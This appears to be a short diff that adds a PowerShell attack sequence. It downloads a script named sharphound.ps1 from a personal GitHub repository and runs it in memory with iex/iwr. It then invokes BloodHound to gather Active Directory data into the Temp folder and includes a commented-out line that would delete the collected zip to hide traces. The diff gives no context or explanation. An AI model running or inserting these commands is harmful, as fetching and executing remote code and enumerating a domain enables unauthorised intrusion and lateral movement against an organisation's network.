@@ -1,0 +1,4 @@
+iex(iwr 'https://raw.githubusercontent.com/d77juan/t3st1n6/main/sharphound.ps1')
+Invoke-BloodHound -OutputDirectory $env:Temp
+sleep 5
+# rm $env:Temp\*BloodHound.zip -r -Force
